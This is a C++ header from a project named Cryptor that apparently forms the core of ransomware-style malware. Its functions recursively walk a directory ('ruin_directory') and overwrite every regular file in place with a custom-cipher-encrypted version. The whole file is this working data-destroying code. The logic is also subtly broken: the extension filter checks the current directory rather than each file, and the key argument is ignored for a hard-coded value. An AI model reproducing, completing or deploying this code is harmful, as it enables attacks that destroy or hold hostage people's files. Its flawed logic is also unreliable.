//
//  cryptor.h
//  Cryptor
//
//  Created by MshRoom2290 on 10/23/25.
//

#ifndef CRYPTOR_H
#define CRYPTOR_H

#include <fstream>
#include <filesystem>
#include <iostream>
#include <string>
#include <vector>
#include "banners.h"
#include "cipher.h"
#include "config.h"

namespace cryptor {
    
namespace fs = std::filesystem;

// Function to identify certain file extensions
bool isExtensionValid(std::vector<std::string> extensions, std::string directory) {
    /* Check to see if the directory we are trying to enter exists */
    if (fs::exists(directory) && fs::is_directory(directory)) {
        try {
            /* If so, iterate through each entry in the provided directory */
            for (const auto& entry : fs::directory_iterator(directory)) {
                
                /* Check to see if the current entry is a regular file and not some directory or a link */
                if (entry.is_regular_file()) {
                    /* Get these file extensions as a string */
                    std::string _ext = entry.path().extension().string();
                    
                    /*
                     * Apply a filter to filter through
                     * these found entries and match them
                     * to the entry extension string
                     */
                    for (const auto& extFilter : extensions) {
                        /*
                         * If the file entry matches the supplied extensions
                         * vector, then, we have our target file, encrypt it
                         */
                        if (_ext == extFilter) {
                            return true;
                        }
                    }
                }
            }
        } catch (fs::filesystem_error& err) {
            banners::print_error({err.what()});
            exit(1);
        }
        
    } else {
        banners::print_error({"Directory does not exist", directory});
        return false;
    }
    
    return false;
}

// Function to encrypt a singular file
void encrypt_file(const fs::path& file_path, char key) {
    /* Open the current target file in binary mode */
    std::ifstream input_file(file_path, std::ios::binary);
    
    /* Throw an error if the current input file cannot be opened */
    if (!input_file) {
        banners::print_error({"Failed to open file/file path for reading", file_path});
        exit(1);
    }
    
    /* Read all of the file into a string */
    std::string buff((std::istreambuf_iterator<char>(input_file)),
                              std::istreambuf_iterator<char>());

    input_file.close();
    
    /* Encrypt the file using MSH cipher if the valid extensions are found */
    
    if (isExtensionValid(validExtensions, fs::current_path())) {
        cipher::msh_cipher(buff, 0xA9);
    }
    
    /* Open the same file for writing */
    std::ofstream ot_file(file_path, std::ios::binary);

    if (!ot_file) {
        banners::print_error({"Could not open file for writing...", file_path});
        exit(1);
    }
    
    /* Write the encrypted data back into the file */
    ot_file.write(buff.c_str(), buff.size());
    ot_file.close();


}

// Function to recursively recurse through the defined directory
void ruin_directory(const fs::path& directory, char key) {
    // Traverse the directory using recursive_directory_iterator (for sub-directories)
    for(const auto& entry : fs::recursive_directory_iterator(directory)) {
        if (entry.is_regular_file()) {
            encrypt_file(entry.path(), key);
        }
    }
}
    
};

#endif
